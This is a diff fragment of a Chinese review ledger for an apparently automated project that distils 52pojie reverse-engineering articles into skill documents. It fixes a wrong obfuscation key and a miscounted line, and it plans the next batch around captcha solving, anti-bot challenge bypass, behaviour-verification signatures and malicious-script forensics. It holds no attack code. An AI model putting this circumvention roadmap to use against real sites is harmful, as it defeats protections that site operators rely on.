+| A1 | **高** | `payload-and-obfuscation.md` §3.1 把派生的 6 字节密钥写成 `"windows"`（应为 `"window"`），`SKILL.md` 资源小节同错 | 评审复算：`77 69 6E 64 6F 77` 只有 **6** 字节；评审以 `base64_decode("BxkeFB8H")` 与 `reverse` 双向复算，输出均无末尾 `s` | **成立，已修 3 处**（`payload-and-obfuscation.md` ×2 + `SKILL.md` ×1）。⇒ 这是本批**最该被自己抓到**的一类错：**自检断言写对了（`b"window"`），文档却写错** —— 判据是"断言与文档必须逐字同源"。 |
+| A2 | 中 | `injection-and-hijack-triage.md` §4.1 写「同一 URL 连写 **8** 次」，回源逐行只有 **7** 次 | 评审给出行号 + 原文 7 行；本轮 `grep -c` 复算 = **7** | **成立，已修**：改成「连写了 **7 次**（回源逐行计数：`52pojie-20874` 第 21–27 行）」；台账里同一处表述同步改。 |
+
+**评审提出、本轮的部分处置**：
+- 「E2E 运行产出无落盘证据」⇒ 本轮已把 5 份真实产出留档在
+  `artifacts/skill-evolution/b25-run-20260923/`（`esc-input/esc-output-527897.txt` + 4 份 `ioc-*.md`），
+  并写进台账的证伪留痕块。
+- 「`payload-and-obfuscation.md` §3.2 的 RC4 样本缺文章编号」⇒ 已补 `52pojie-822344`。
+- 「`miniprogram-reverse` 排错表里 `RadiumWMPF` 的版本号与内容超出该文范围」⇒ **确认属实但非本轮引入**：
+  该行在开工前备份 `backup-20260923-2124-skills/` 里已存在（`grep -c` = 2）⇒ 记入**B26 待办**，
+  本轮不顺手改（避免在未回源的情况下动别批次的内容）。
+- 「事实保真 A1–A7 与改前文档的差异均有来源依据」⇒ 评审确认无误，无需处置。
+
+### 下一批（B26）取材建议（承接本节）
+
+- 待处理 **419** 篇（台账 507 条后；本批登记 19 条）。
+- 优先级：
+  ① **验证码图像识别系的坐标侧**（真拼图 / 双缺口 / 旋转点选）—— 连续多轮列为候选却一直没吃到，下一批应**优先聚簇**；
+  ② **站前挑战厂商带**继续按 B24 写进文档的操作清单扩容（**优先取带完整纯算交付的**）；
+  ③ **无感 / 行为验证**剩余并入 `behavior-verify-and-sign-headers.md`，**不要为每家建新文件**；
+  ④ **恶意脚本 / 钓鱼取证**这条线已建库，后续按「同类只 evolve、出现新壳型才动脚本」的口径收进 `web-malware-forensics`；
+  ⑤ **桌面客户端薄区**（Tauri / node:sea / 原生模块）：本批**首次命中**（V8 JSC 那篇），
+     上一轮定的「再 0 命中就停止列为候选」口径**暂缓执行**，按「有新素材就继续」处理。
+- **B26 待办（评审带出，非本轮引入）**：`miniprogram-reverse` 排错表里的 `RadiumWMPF` 版本绑定条目在对应源文章里查不到（开工前备份里已存在）⇒ 下一批若碰该技能，**先回源复核或降级为「未证」标注**。
+- 候选新技能 `captcha-flow-orchestration` —— B5–B25 **十九次确认不新建**
+  （证据池仍未跨越「单站一流程」到「可复用编排协议」的门槛）。
+- 已 `skip` 未建档：B1-17（小程序）、B7-18（某查查）、B8-131（某音滑块纯算）、B13-216（WX 小程序反编译）。
+  **注**：B1-17 / B13-216 的「不建小程序技能」结论在 B22 已被**推翻并取代**，旧结论只保留可追溯性。
